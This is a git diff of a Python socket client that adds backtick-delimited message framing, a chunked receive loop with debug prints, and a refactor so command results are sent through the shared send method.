@@ -8,6 +8,7 @@ import json
 
 class Client:
 	encoding = "utf-8"
+	msg_byte_len = 1024
 	def __init__(self, ip, port):
 		self._ip = ip
 		self._port = port
@@ -55,16 +56,24 @@ class Client:
 
 #Add encrpytion!!!
 	def send(self):
-		message = self._client_msg.to_json()
+		message = self._client_msg.to_json() + "`"
 		try:
 			self._client.send(bytes(message, Client.encoding))
 		except:
 			print("Failed to send")
 
 	def recieve(self):
+		raw_res = " "
 		try:
-			raw_res = self._client.recv(4096).decode(Client.encoding)
-			dict_res = json.loads(raw_res)
+			while raw_res[-1] != "`":
+				if raw_res == " ":
+					raw_res = ""
+				print("|" + raw_res + "|")
+				raw_res += self._client.recv(Client.msg_byte_len).decode(Client.encoding)
+				print("|" + raw_res + "|")
+			res = raw_res.replace("`", "")
+			print(res)
+			dict_res = json.loads(res)
 			return dict_res
 		except:
 			print("Failed to recieve")
@@ -73,9 +82,8 @@ class Client:
 	def send_results(self, command_id, exit_code, stdout, stderr=""):
 		# whoami, ping, ready, completed, stdout, stderr, successful, exit_code, command_id
 		self._client_msg.add_data("localhost", False, True, True, stdout, stderr, True, exit_code, command_id)
-		message = self._client_msg.to_json()
 		try:
-			self._client.send(bytes(message, Client.encoding))
+			self.send()
 			# res = self._client.recv(4096).decode(Client.encoding)
 			# print(res)
 		except:
